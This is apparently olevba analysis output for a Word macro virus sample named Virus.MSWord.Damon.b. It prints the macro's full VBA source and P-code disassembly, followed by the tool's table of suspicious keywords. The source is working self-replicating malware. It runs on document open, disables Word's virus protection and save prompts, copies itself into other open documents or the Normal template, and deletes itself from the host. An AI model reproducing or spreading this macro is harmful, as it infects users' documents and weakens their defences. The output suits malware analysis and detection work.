olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Damon.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Damon.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0

If Day(Now) = 25 And Month(Now) = 12 Then
    Randomize: For CE4470 = 1 To (Int(Rnd * 70))
    ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
    Selection.ShapeRange.Fill.Visible = msoTrue
    Selection.ShapeRange.Fill.Solid: Next CE4470:
End If


TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If Documents.Count > 1 Then
A = Int(Rnd * Documents.Count) + 1
If A > Documents.Count Then A = A - 1
If Documents.Item(A) = ThisDocument Then End
Set Target = Documents.Item(A).VBProject.VBComponents.Item(1).CodeModule
Target.DeleteLines 1, Target.CountOfLines
Target.AddFromString TD
Documents.Item(A).SaveAs FileName:=Documents.Item(A).FullName
Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Host.DeleteLines 1, Host.CountOfLines
ThisDocument.SaveAs FileName:=ThisDocument.FullName
Else
If ThisDocument = ActiveDocument Then
Set Target = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Target.DeleteLines 1, Target.CountOfLines
Target.AddFromString TD
Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Host.DeleteLines 1, Host.CountOfLines
ThisDocument.SaveAs FileName:=ThisDocument.FullName
End If
If ThisDocument = NormalTemplate Then
Set Target = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Target.DeleteLines 1, Target.CountOfLines
Target.AddFromString TD
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Host.DeleteLines 1, Host.CountOfLines
End If
End If
End Sub
'Nomad By Lys Kovick
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Damon.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3898 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' Line #6:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #7:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld CE4470 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0046 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	For 
' Line #8:
' 	Ld Rnd 
' 	LitDI2 0x0078 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #10:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #11:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld CE4470 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' Line #12:
' 	EndIfBlock 
' Line #13:
' Line #14:
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St TD 
' Line #16:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #17:
' 	Ld Rnd 
' 	Ld Documents 
' 	MemLd Count 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St A 
' Line #18:
' 	Ld A 
' 	Ld Documents 
' 	MemLd Count 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld A 
' 	LitDI2 0x0001 
' 	Sub 
' 	St A 
' 	EndIf 
' Line #19:
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	Ld ThisDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Target 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld Target 
' 	MemLd CountOfLines 
' 	Ld Target 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #22:
' 	Ld TD 
' 	Ld Target 
' 	ArgsMemCall AddFromString 0x0001 
' Line #23:
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Host 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld Host 
' 	MemLd CountOfLines 
' 	Ld Host 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #26:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ThisDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #27:
' 	ElseBlock 
' Line #28:
' 	Ld ThisDocument 
' 	Ld ActiveDocument 
' 	Eq 
' 	IfBlock 
' Line #29:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Target 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld Target 
' 	MemLd CountOfLines 
' 	Ld Target 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #31:
' 	Ld TD 
' 	Ld Target 
' 	ArgsMemCall AddFromString 0x0001 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Host 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld Host 
' 	MemLd CountOfLines 
' 	Ld Host 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #34:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ThisDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld ThisDocument 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #37:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Target 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld Target 
' 	MemLd CountOfLines 
' 	Ld Target 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #39:
' 	Ld TD 
' 	Ld Target 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #41:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Host 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld Host 
' 	MemLd CountOfLines 
' 	Ld Host 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndSub 
' Line #46:
' 	QuoteRem 0x0000 0x0013 "Nomad By Lys Kovick"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

